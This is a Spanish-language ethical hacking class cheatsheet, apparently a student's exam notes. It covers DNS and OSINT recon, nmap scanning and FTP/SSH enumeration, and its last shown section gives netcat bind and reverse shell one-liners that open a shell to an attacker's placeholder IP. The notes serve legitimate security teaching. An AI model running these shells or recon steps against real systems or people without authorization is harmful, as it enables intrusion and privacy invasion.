---
title: "[ES] Cheatsheet - Hacking Etico Tema 1"
date: 2025-02-03T00:00:00+00:00
tags: ["hacking", "classnotes","spanish","cybersec"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Hoja de referencia para el primer examen de HE CECS"
---

## Recon DNS 1

Records WHOIS -> Punteros DNS con Dig -> Zonetransfer (A-REC)

(comandos: nslookup, dnsenum, dig, whois, host)

``` bash
whois [dominio/IP/rango]
host [dominio]
host -t [tipoDeRegistro] [dominio]
nslookup -type=[registro] [dominio]
```

---

## Recon DNS 2

Archivos de transferncia de zona: Realizando peticiones AXFR de un host a un nameserver

 Obtenemos los NS
 
``` bash
dig NS [dominio]
```

Despues podemos realizar la comprobacion con host, dig, dnsenum y dnsrecon:

``` bash
dig [@nameserver] [dominio] axfr
dnsenum [dominio]
host -la [dominio] [nameserver]
dnsrecon -d [domain] -t axfr
``` 

---

## Recon DNS 3

Enumeracion de subdominios:

Puede ser mediante dorks o crt.sh:

``` bash
site:[dominio] -www
dnsrecon -d [domain/OrganizationName] -t crt
```

O mediante fuerza bruta, por ejemplo:

``` bash
dnsrecon -d [domain] -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## OSINT de usuarios y correos

Podemos utilizar dorks como intext: o inurl: con nombres de usuario para averiguar informacion sobre ellos. A nivel corporativo podemos usar theHarvester y h8mail:

``` bash
theHarvester -d [dominio] -a
h8mail -t [cuentadecorreo]
```

A nivel usuario la herramienta por excelencia es Sherlock:

``` bash
sherlock [nombreDeUsuario]
```

Aunque tambien podemos utilizar el OSINT Framework y sus paginas como whaymyname.app y thatsthem

---

## GEOSINT

Principalmente usamos geospy.ai, aunque tambien es posible una triangulacion manual con tecnicas de plonk.it

---

## Enumeracion 1 - Descubrir Hosts

Las dos opciones principales son el Ping sweep (ICMP echo pckts) y ARP Sweep.

Ping sweep utiliza ICMP, algunos dispositivos estan configurados para no responder a este tipo de trafico (Windows por defecto).

ARP Sweep nos permite utilizar una funcionalidad de red basica, todos los dispositivos estan obligados a responder a ARP ya que si no las LAN no funcionarian. La debelidad de este metodo se basa en que ARP funciona UNICAMENTE en redes locales (las peticiones ARP mueren en los routers)

Podemos realizar un ARP sweep manualmente:

``` bash
sudo arping -i [red/interfaz] -c [cantidadDePaquetes] [IP]
```

O podemos utilizar nmap, si detecta que la red es local utilizara ARP, si no utilizara ICMP:

``` bash
sudo nmap -sn [red]/[mascara]
```

Tambien hay que tener en cuenta el concepto de visibilidad: 

``` bash
ping [objetivo]
```

Nos permitira ver si un objetivo responde a nuestra peticion ICMP. Si lo hace sabemos que podemos alcanzar esa IP, si no lo hace lo unico que sabemos es que no podemos alcanzarla mediante ICMP (no debemos descartar que el pc este activo pero que no responda)

Si tenemos respuesta, el TTL nos puede dar una idea orientativa de que sistema operativo ejecuta el objetivo, ya que por defecto:

- Linux: TTL=64
- Windows: TTL=128

---

## Enumeracion 2 - Escaneo de puertos y servicios

Podemos hacerlo manualmente con netcat:

``` bash
nc -nzv [IP] [puerto]
```

Con Nmap puede sacar el estado de los puertos del tipo:
- Open
- Closed
- Filtered (Cuando se deduce que hay un firewall)
- Unfiltered (Producido solo por el escaneo ACK, cuando nmap no es capaz de interpretar la respuesta)
- open|filtered (Solo en escaneos NULL, FIN, UDP y Xmas, significa abierto o con firewall pero no determinable)
- closed|filtered (Ocurre solo con escaneos Idle)

Proprocionare solo un buen escaneo de nmap:

``` bash
sudo nmap -sS -sV -sC -O -T5 -p- -Pn [IP] -oN [fichero_salida].txt/.nmap
```

Donde:
- sS: Indica que realicemos el escaneo mediante paquetes SYN TCP
- sV: Indica que nmap tendra que averiguar que tipo de servicio se ejecuta en cada puerto
- sC: Indica que nmap tendra que ejecutar los scripts de reconocimiento basicos
- O: Indica que nmap tendra que intentar averiguar el sistema operativo y su version
- p- : Indica que nmap tendra que escanear todos los puertos TCP
- oN: Indica que nmap tendra que crear una copia de su salida al fichero especificado en formato texto plano

Podriamos reemplazar -sC -sV -O por -A.

---

## Enumeracion 3 - Scripting con nmap:

Los scripts de nmap estan en /usr/share/nmap/scripts/

Sirven para la enumeracion de servicios en detalle, deteccion de vulnerabilidades y backdoors y realizacion de ciertos tipos de ataque de fuerza bruta. Son similares a los modulos auxiliares de Metasploit.

Pueden ejecutarse con:

``` bash
sudo nmap --script [nombreScript] [IP]
```

---

## Enumeracion 4 - SSH y FTP

Son dos de los servicios mas basicos, se pueden enumerar mediante scripts de nmap. En el caso de FTP debemos saber algunos comandos propios:

- help: ver todos los comandos
- help {comando}: ver que hace un comando
- pwd: ver directorio
- dir / ls: ver directorio
- !: ejecutar comandos en la maquina local (!ls para listar la maquina local)
- put: intentar subir ficheros
- get: Descargar fichero
- mget: Descargar ficheros masivamente
- put: subir ficheros
- mput: subir ficheros masivamente
- mkdir: crear carpetas
- rm: borrar

Se pueden hacer ataques de fuerza bruta y password spray contra FTP y SSH. Si SSH es OpenSSH <7.7 ademas es vulnerable a un ataque de fuerza bruta de usuarios que podemos hacer mediante metasploit (Con el modulo auxiliar auxiliary/scanner/ssh/ssh_enumusers y una wordlist como por ejemplo /usr/share/metasploit-framework/unix_users.txt)

---

## Explotacion 1 - Bind Shells y Reverse Shells

- Bind Shell: El atacante inicia la conexion
- Reverse Shell: La victima inicia la conexion

(Ver adquisicion de shells con distintos metodos: InternalAllTheThings)

**Bind Shell**:

En la victima: 

``` bash
nc -nlvp [puerto] -e /bin/[shellbin]
```

En el equipo atacante:

``` bash
nc -nv [ipAtacante] [puerto]
```

**Reverse Shell**:

Especialmente util ya que la mayoria de bind shells no funcionara por los firewalls.

Maquina atacante:

``` bash
nc -nlvp [puerto]
```

En la maquina victima:

``` bash
nc -e /bin/[shellbin] [IP_Atacante] [Puerto]
```

---

## Explotacion 2 - Fuerza Bruta con Hydra y Medusa

[...]